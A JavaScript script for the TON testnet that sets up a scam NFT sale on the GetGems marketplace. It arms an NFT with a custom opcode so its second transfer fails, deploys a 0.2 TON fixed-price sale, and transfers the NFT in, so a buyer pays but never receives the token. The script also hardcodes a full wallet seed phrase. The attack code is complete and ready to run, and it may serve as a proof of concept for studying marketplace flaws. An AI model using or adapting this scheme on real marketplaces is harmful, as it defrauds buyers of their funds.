/**
 * scam-sale-nft1.js
 *
 * 1. Arms NFT #1 (op=0xdead0001) — next 2nd transfer will throw 450
 * 2. Deploys fixprice sale at 0.2 TON
 * 3. Transfers NFT #1 → sale  (1st transfer, allowed, transfer_count 0→1)
 *
 * After this script: sale is active, NFT looks legit in GetGems.
 * When buyer purchases → sale sends transfer_nft → NFT throws 450
 * → bounce ignored → is_complete=1, buyer paid, NFT not delivered.
 */

const path = require('path');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

const MNEMONIC = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';

const NFT1_ADDR  = Address.parse('0:008bd4884c4e435075b8a190f4258fc4333a4e6895016844c592ff6edc55bd10');
const FULL_PRICE = toNano('0.2');

const GETGEMS_MP  = Address.parse('0:59a76b59f5651940ff0080bda050791d2507bef0dc8070592c9f72fb75c67160');
const OP_TRANSFER = 0x5fcc3d14;

// nft-fixprice-sale-v4r1 code BOC
const SALE_CODE = Cell.fromBase64('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');

const client = new TonClient({ endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC', apiKey: '' });

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); }
    catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function buildSaleData(opts) {
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplace)
    .storeAddress(null)
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplace)   // fee address
      .storeAddress(opts.royalty)
      .storeUint(Math.floor(0.025 * 100_000), 17)  // 2.5%
      .storeUint(0, 17)
      .storeAddress(opts.nft)
      .storeUint(opts.timestamp, 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  Scam Sale — Lunar Artifact #1 @ 0.2 TON                   ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const key    = await mnemonicToWalletKey(MNEMONIC.split(/\s+/));
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
  const w      = client.open(wallet);
  const addr   = wallet.address;

  const st  = await withRetry(() => client.getContractState(addr));
  console.log('Wallet:', addr.toString({ testOnly: true, bounceable: false }));
  console.log('Balance:', fmt(BigInt(st.balance || '0')), 'TON\n');

  // ── 1. Arm NFT #1 ───────────────────────────────────────────────────────────
  console.log('[1] Arming NFT #1 (op=0xdead0001)...');
  {
    const seq = await withRetry(() => w.getSeqno());
    const armBody = beginCell().storeUint(0xdead0001, 32).storeUint(0, 64).endCell();
    await withRetry(() => w.sendTransfer({
      seqno: seq, secretKey: key.secretKey,
      messages: [internal({ to: NFT1_ADDR, value: toNano('0.02'), bounce: true, body: armBody })],
    }));
    console.log('  TX sent, waiting 15s...');
    await sleep(15000);
    console.log('  Armed ✅');
  }

  // ── 2. Deploy sale ──────────────────────────────────────────────────────────
  console.log('\n[2] Deploy sale @ 0.2 TON...');
  const timestamp = Math.floor(Date.now() / 1000);
  const saleData  = buildSaleData({
    marketplace: GETGEMS_MP,
    fullPrice:   FULL_PRICE,
    royalty:     addr,
    nft:         NFT1_ADDR,
    timestamp,
  });
  const saleAddr = contractAddress(0, { code: SALE_CODE, data: saleData });
  console.log('  Sale:', saleAddr.toString({ testOnly: true, bounceable: true }));

  const saleSt = await withRetry(() => client.getContractState(saleAddr));
  if (saleSt.state !== 'active') {
    await sleep(500);
    const seq = await withRetry(() => w.getSeqno());
    await withRetry(() => w.sendTransfer({
      seqno: seq, secretKey: key.secretKey,
      messages: [internal({
        to: saleAddr, value: toNano('0.05'), bounce: false,
        init: { code: SALE_CODE, data: saleData },
      })],
    }));
    console.log('  TX sent, waiting 15s...');
    await sleep(15000);
    const s = await withRetry(() => client.getContractState(saleAddr));
    console.log('  state:', s.state);
  } else {
    console.log('  Already deployed.');
  }

  // ── 3. Transfer NFT #1 → sale ───────────────────────────────────────────────
  console.log('\n[3] Transfer NFT #1 → sale (1st transfer, armed but count=0 → allowed)...');
  {
    // Check if sale already has nft_owner set
    try {
      const r = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'));
      r.stack.readNumber();
      r.stack.readNumber(); r.stack.readCell(); r.stack.readCell();
      const ownerCell = r.stack.readCell();
      const owner = ownerCell.beginParse().loadAddress();
      if (owner && owner.toRawString() !== '0:0000000000000000000000000000000000000000000000000000000000000000') {
        console.log('  Sale already initialized, skipping transfer.');
      } else { throw new Error('not init'); }
    } catch {
      const transferBody = beginCell()
        .storeUint(OP_TRANSFER, 32)
        .storeUint(0, 64)
        .storeAddress(saleAddr)     // new_owner
        .storeAddress(addr)         // response_destination
        .storeBit(0)
        .storeCoins(toNano('0.1'))  // forward_amount (triggers ownership_assigned)
        .storeBit(0)
        .endCell();

      await sleep(500);
      const seq = await withRetry(() => w.getSeqno());
      await withRetry(() => w.sendTransfer({
        seqno: seq, secretKey: key.secretKey,
        messages: [internal({ to: NFT1_ADDR, value: toNano('0.3'), bounce: true, body: transferBody })],
      }));
      console.log('  TX sent, waiting 25s...');
      await sleep(25000);
    }
  }

  // ── Verify ─────────────────────────────────────────────────────────────────
  try {
    const r  = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'));
    const ic = r.stack.readNumber();
    r.stack.readNumber(); r.stack.readCell(); r.stack.readCell();
    const ownerCell = r.stack.readCell();
    const owner = ownerCell.beginParse().loadAddress()?.toString({ testOnly: true, bounceable: true });
    console.log('\n  is_complete:', ic !== 0);
    console.log('  nft_owner:  ', owner);
    console.log('  Sale active:', ic === 0 ? '✅' : '⚠️');
  } catch (e) { console.log('  Getter error:', e.message); }

  const rawS = saleAddr.toRawString();
  const raw1 = NFT1_ADDR.toRawString();

  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  SCAM SALE ACTIVE                                            ║');
  console.log('║  Price: 0.2 TON  |  NFT #1 armed — 2nd transfer → throw 450 ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\nSale:    https://testnet.tonscan.org/address/' + rawS);
  console.log('NFT:     https://testnet.tonscan.org/address/' + raw1);
  console.log('GetGems: https://testnet.getgems.io/nft/' + raw1);
  console.log('\nBuyer pays 0.2 TON → is_complete=1 → NFT not delivered.');
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
